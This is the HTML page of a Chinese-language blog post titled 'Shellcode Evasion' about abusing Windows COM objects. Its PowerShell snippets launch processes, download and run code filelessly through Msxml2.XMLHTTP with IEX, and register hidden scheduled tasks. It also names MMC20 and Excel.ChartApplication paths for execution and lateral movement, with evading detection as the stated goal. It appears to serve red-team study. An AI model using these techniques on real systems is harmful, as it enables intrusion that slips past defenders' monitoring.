@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blueinyou.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="关于CLSID的利用，抄袭https:&#x2F;&#x2F;blog.51cto.com&#x2F;u_15127538&#x2F;2706618  COM  （Component Object Model）面向对象的编程模型，定义组件及其接口，让接口和实现分离， 组件信息通常存储在Windows注册表中 。 COM是在1990年代创建的，作为独立于语言的二进制互相操作性标准，COM使得单独的代码模块能够相互交互。这样一来，就可以在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shellcode Evasion">
+<meta property="og:url" content="https://blueinyou.com/categories/CTF/Shellcode01/index.html">
+<meta property="og:site_name" content="Paul C&#39;s Blog">
+<meta property="og:description" content="关于CLSID的利用，抄袭https:&#x2F;&#x2F;blog.51cto.com&#x2F;u_15127538&#x2F;2706618  COM  （Component Object Model）面向对象的编程模型，定义组件及其接口，让接口和实现分离， 组件信息通常存储在Windows注册表中 。 COM是在1990年代创建的，作为独立于语言的二进制互相操作性标准，COM使得单独的代码模块能够相互交互。这样一来，就可以在">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blueinyou.com/categories/CTF/Shellcode01/1693235040046.png">
+<meta property="og:image" content="https://blueinyou.com/categories/CTF/Shellcode01/1693235288620.png">
+<meta property="og:image" content="https://blueinyou.com/categories/CTF/Shellcode01/1693235404222.png">
+<meta property="og:image" content="https://blueinyou.com/categories/CTF/Shellcode01/1693235499814.png">
+<meta property="og:image" content="https://blueinyou.com/categories/CTF/Shellcode01/1693235560701.png">
+<meta property="article:published_time" content="2023-08-28T06:19:49.000Z">
+<meta property="article:modified_time" content="2023-08-28T15:12:54.861Z">
+<meta property="article:author" content="Paul C">
+<meta property="article:tag" content="逆向">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blueinyou.com/categories/CTF/Shellcode01/1693235040046.png">
+
+<link rel="canonical" href="https://blueinyou.com/categories/CTF/Shellcode01/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Shellcode Evasion | Paul C's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Paul C's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">To be funny,to grow up!</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Shellcode01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Shellcode Evasion
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-08-28 14:19:49 / Modified: 23:12:54" itemprop="dateCreated datePublished" datetime="2023-08-28T14:19:49+08:00">2023-08-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>关于CLSID的利用，抄袭<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15127538/2706618">https://blog.51cto.com/u_15127538/2706618</a></p>
+</blockquote>
+<h2 id="COM-（Component-Object-Model）"><a href="#COM-（Component-Object-Model）" class="headerlink" title="COM  （Component Object Model）"></a>COM  （Component Object Model）</h2><p>面向对象的编程模型，定义组件及其接口，让接口和实现分离， 组件信息通常存储在Windows注册表中 。</p>
+<p>COM是在1990年代创建的，作为独立于语言的二进制互相操作性标准，COM使得单独的代码模块能够相互交互。这样一来，就可以在单个进程或跨进程中实现，为分布式COM（DCOM）添加序列化，允许通过网络进行远程过程调用（Remote Procedure Call）。</p>
+<p>1.CLSID 类标识符</p>
+<p>2.IID 接口标识符</p>
+<p>3.组件的文件路径</p>
+<p>可以使用oleview.exe查看。</p>
+<h2 id="几个有趣的COM对象"><a href="#几个有趣的COM对象" class="headerlink" title="几个有趣的COM对象"></a>几个有趣的COM对象</h2><p>可以允许任务调度、无文件下载并执行、命令执行。尽管这些对象本身不是安全漏洞，但可以使用这些对象基于进程行为和启发式特征来对抗检测。</p>
+<p>注册表项<code>HKEY_CLASSES_ROOT\CLSID</code>将公开枚举COM对象所需的所有信息，包括CLSID和ProgID。CLSID是与COM类对象关联的全局唯一标识符。ProgID是一个对开发者非常友好的字符串，表示底层的CLSID。</p>
+<p>使用下面的PowerShell命令来获取CLSID列表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">列举HKCR下的CLSID：</span><br><span class="line"></span><br><span class="line">New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR</span><br><span class="line">Get-ChildItem -Path HKCR:\CLSID -Name  | Select -Skip 1 &gt; clsids.txt</span><br></pre></td></tr></table></figure>
+<h3 id="获取所有CLSID公开的方法和属性"><a href="#获取所有CLSID公开的方法和属性" class="headerlink" title="获取所有CLSID公开的方法和属性"></a>获取所有CLSID公开的方法和属性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">用于枚举可用方法和属性的PowerShell Scriptlet：</span><br><span class="line">得等待一会，因为有7356个条目要被执行</span><br><span class="line"></span><br><span class="line">$Position = 1  </span><br><span class="line">$Filename = &quot;win10-clsid-members.txt&quot;  </span><br><span class="line">$inputFilename = &quot;clsids.txt&quot;  </span><br><span class="line">ForEach($CLSID in Get-Content $inputFilename) &#123;</span><br><span class="line">	Write-Output &quot;$($Position) - $($CLSID)&quot;</span><br><span class="line">	Write-Output &quot;------------------------&quot; | Out-File $Filename -Append</span><br><span class="line">	Write-Output $($CLSID) | Out-File $Filename -Append </span><br><span class="line">	$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))</span><br><span class="line">	$handle | Get-Member | Out-File $Filename -Append</span><br><span class="line">	$Position += 1  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>非Microsoft的COM对象通常会被省略，因为它们不能可靠地存在于目标及其上，这限制了这些对象在红蓝对抗实际蓝军<em>*</em>中的可用性。为了定位开发人员的计算机，我们在此项研究中涵盖了Windows SDK中的特定Microsoft COM对象。</p>
+<p>在获得成员后，使用基于关键字的搜索方法快速得到结果。在我们的研究中，使用了以下关键字：execute（执行）、exec（执行）、spawn（派生）、launch（执行）和run（运行）。</p>
+<h2 id="启动进程"><a href="#启动进程" class="headerlink" title="启动进程"></a>启动进程</h2><p>可以启动命令，如下所示。</p>
+<p>使用ProcessChainLib COM服务器启动进程：</p>
+<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$handle</span> = [<span class="type">activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromCLSID(<span class="string">&quot;E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="variable">$handle</span>.CommandLine = <span class="string">&quot;cmd /c whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$handle</span>.Start([<span class="type">ref</span>]<span class="variable">$True</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="无文件下载和执行"><a href="#无文件下载和执行" class="headerlink" title="无文件下载和执行"></a>无文件下载和执行</h2><p>COM对象{F5078F35-C551-11D3-89B9-0000F81FE221}（Msxml2.XMLHTTP.3.0）公开了一个XML HTTP 3.0功能，该功能可用于下载任意代码并执行，无需将Payload写入磁盘，并且不会触发寻找常用System.Net.WebClient的规则。XML HTTP 3.0对象通常用于执行AJAX请求。在这种情况下，可以使用Invoke-Expression Cmdlet（IEX）直接执行获取的数据。</p>
+<p>下面的示例展示了本地执行代码的过程。</p>
+<p>不包含System.Net.WebClient的无文件下载：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$o = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;));</span><br><span class="line">$o.Open(&quot;GET&quot;, &quot;http://127.0.0.1/payload&quot;, $False);</span><br><span class="line">$o.Send(); IEX $o.responseText;</span><br></pre></td></tr></table></figure>
+<h3 id="任务调度"><a href="#任务调度" class="headerlink" title="任务调度"></a>任务调度</h3><p>另一个例子是{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}，它实现了用于操作Windows任务调度程序服务的Schedule.Service类。该COM对象允许特权用户在不使用schtasks.exe二进制文件或at命令的情况下，在主机（包括远程主机）上执行计划任务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$TaskName = [Guid]::NewGuid().ToString()</span><br><span class="line"></span><br><span class="line">$Instance = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))</span><br><span class="line"></span><br><span class="line">$Instance.Connect()</span><br><span class="line"></span><br><span class="line">$Folder = $Instance.GetFolder(&quot;\&quot;)</span><br><span class="line"></span><br><span class="line">$Task = $Instance.NewTask(0)</span><br><span class="line"></span><br><span class="line">$Trigger = $Task.triggers.Create(0)</span><br><span class="line"></span><br><span class="line">$Trigger.StartBoundary = Convert-Date -Date ((Get-Date).addSeconds($Delay))</span><br><span class="line"></span><br><span class="line">$Trigger.EndBoundary = Convert-Date -Date ((Get-Date).addSeconds($Delay   120))</span><br><span class="line"></span><br><span class="line">$Trigger.ExecutionTimelimit = &quot;PT5M&quot;</span><br><span class="line"></span><br><span class="line">$Trigger.Enabled = $True</span><br><span class="line"></span><br><span class="line">$Trigger.Id = $Taskname</span><br><span class="line"></span><br><span class="line">$Action = $Task.Actions.Create(0)</span><br><span class="line"></span><br><span class="line">$Action.Path = “cmd.exe”</span><br><span class="line"></span><br><span class="line">$Action.Arguments = “/c whoami”</span><br><span class="line"></span><br><span class="line">$Action.HideAppWindow = $True</span><br><span class="line"></span><br><span class="line">$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">function Convert-Date &#123;      </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        param(</span><br><span class="line"></span><br><span class="line">             [datetime]$Date</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        )      </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        PROCESS &#123;</span><br><span class="line"></span><br><span class="line">               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="COM对象枚举：递归COM对象"><a href="#COM对象枚举：递归COM对象" class="headerlink" title="COM对象枚举：递归COM对象"></a>COM对象枚举：递归COM对象</h2><p>每个对象都可能会返回无法直接创建的其他对象。在这里，引入的更改以递归方式搜索COM对象，这些对象仅通过每个枚举OCM对象的成员方法和属性公开。在原始方法中，查看了每个对象直接公开的方法，并没有递归到任何属性，这些属性也可能是自身具有值得关注的方法的COM对象，可以找到调用公开代码执行COM对象方法的新方法。</p>
+<h3 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h3><p>目前公开的所有使用COM对象执行代码的技术，发现它们之间具有一个共同点，就是都利用了在COM对象的子属性中公开的方法。一个例子是“MMC20.Application”COM对象。要利用此COM对象实现代码执行，我们需要在“Document.ActiveView”属性返回的View对象上使用“ExecuteShellCommand”方法，正如Matt Nelson在博客文章上所写的那样。在下图中，我们可以看到该方法只能在“Document.ActiveView”返回的对象中被发现，并且不会被MMC20.Application COM对象直接暴露。</p>
+<p>列出MMC20.Application COM对象中的ExecuteShellCommand方法：</p>
+<p><img src="/categories/CTF/Shellcode01/1693235040046.png" alt="1693235040046"></p>
+<h3 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h3><p>另一个例子是“ShellBrowserWindow”COM对象，这也是由Matt Nelson在博客文章中首次撰写的。如下图所示，“ShellExecute”方法没有直接暴露在COM对象中。但是，“Document.Application”属性返回Shell对象的实例，该实例公开ShellExecute方法。</p>
+<p>在ShellBrowserWindow COM对象中列出ExecuteShellCommand方法：</p>
+<p><img src="/categories/CTF/Shellcode01/1693235288620.png" alt="1693235288620"></p>
+<p>作为前两个示例的证据，重要的是不仅要查看COM对象直接公开的方法，还要递归查找具有作为COM对象属性公开的可用方法的对象。这个示例说明了为什么仅仅静态探索COM对象的类型库可能是不够的，只有在动态枚举泛型类型IDispatch的对象后才能访问相关函数。这种递归的方法可以实现查找用于代码执行的新COM对象，以及使用可用于代码执行的公开COM对象的不同方法。</p>
+<p>使用这种递归方法，如何找到一种调用公开COM对象方法的新途径呢？我们可以参考“ShellBrowserWindow”COM对象中的“ShellExecute”方法。该方法在本文前面已经详细说明过。以前，众所周知，在“ShellBrowserWindow”COM对象中调用此方法的方式是使用“Document.Application”属性。通过递归COM对象方法，我们发现，还可以对“Document.Application.Parent”属性返回的对象调用“ShellExecute”方法，如下图所示。可以逃避检测。</p>
+<h3 id="例子3"><a href="#例子3" class="headerlink" title="例子3"></a>例子3</h3><p>使用ShellBrowserWindow COM对象调用ShellExecute的替代方法：</p>
+<p><img src="/categories/CTF/Shellcode01/1693235404222.png" alt="1693235404222"></p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>使用这种递归COM对象方法进行探索后，我们能够找到一个ProgID为“Excel.ChartApplication”的COM对象，该对象可用于使用DDEInitiate方法执行代码。这种启动可执行文件的DDEInitiate方法首先在“Excel.Application”COM对象中被滥用，如Cybereason所写的文章所示。“Excel.ChartApplication”COM对象中有多个属性，它们返回可用于执行DDEInitiate方法的对象，如下图所示。尽管这个DDEInitiate方法也是由COM对象直接公开的，但它是在最初的探索过程中被发现的，是在可以从此对象访问的其他对象中公开的方法。</p>
+<p>使用Excel.ChartApplication COM对象调用DDEInitiate的3种方法：</p>
+<p><img src="/categories/CTF/Shellcode01/1693235499814.png" alt="1693235499814"></p>
+<p>该COM对象也可以实例化，并远程用于Office 2013，如下图所示。COM对象只能在Office 2016中本地实例化。当尝试远程实例化Office 2016时，将会返回错误代码，表示COM对象类未注册远程实例化。</p>
+<p>使用Excel.ChartApplication远程<em>*</em>Office 2013：</p>
+<p><img src="/categories/CTF/Shellcode01/1693235560701.png" alt="1693235560701"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>COM对象非常强大，功能多样，并且与Windows集成，这也就意味着COM对象几乎总是可用的。COM对象可以用于打破不同的检测模式，包括命令行参数、PowerShell日志记录和启发式检测。COM对象方法的递归搜索，可以帮助我们发现可用于代码执行的新COM对象，以及调用众所周知COM对象方法的新思路。这些COM对象方法可用于打破不同的检测模式，也可以用于横向移动。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%80%86%E5%90%91/" rel="tag"># 逆向</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/categories/CTF/Untitled/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#COM-%EF%BC%88Component-Object-Model%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">COM  （Component Object Model）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%A0%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84COM%E5%AF%B9%E8%B1%A1"><span class="nav-number">2.</span> <span class="nav-text">几个有趣的COM对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89CLSID%E5%85%AC%E5%BC%80%E7%9A%84%E6%96%B9%E6%B3%95%E5%92%8C%E5%B1%9E%E6%80%A7"><span class="nav-number">2.1.</span> <span class="nav-text">获取所有CLSID公开的方法和属性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">启动进程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C"><span class="nav-number">4.</span> <span class="nav-text">无文件下载和执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6"><span class="nav-number">4.1.</span> <span class="nav-text">任务调度</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#COM%E5%AF%B9%E8%B1%A1%E6%9E%9A%E4%B8%BE%EF%BC%9A%E9%80%92%E5%BD%92COM%E5%AF%B9%E8%B1%A1"><span class="nav-number">5.</span> <span class="nav-text">COM对象枚举：递归COM对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E5%AD%901"><span class="nav-number">5.1.</span> <span class="nav-text">例子1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E5%AD%902"><span class="nav-number">5.2.</span> <span class="nav-text">例子2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E5%AD%903"><span class="nav-number">5.3.</span> <span class="nav-text">例子3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">6.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Paul C"
+      src="https://blueinyou.com/photos/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Paul C</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">152</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">57</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/memoryofsnow" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;memoryofsnow" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2215489940@qq.com" title="E-Mail → mailto:2215489940@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/jiyi_guoshu" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;jiyi_guoshu" rel="noopener" target="_blank"><i class="fab fa-csdn fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Paul C</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
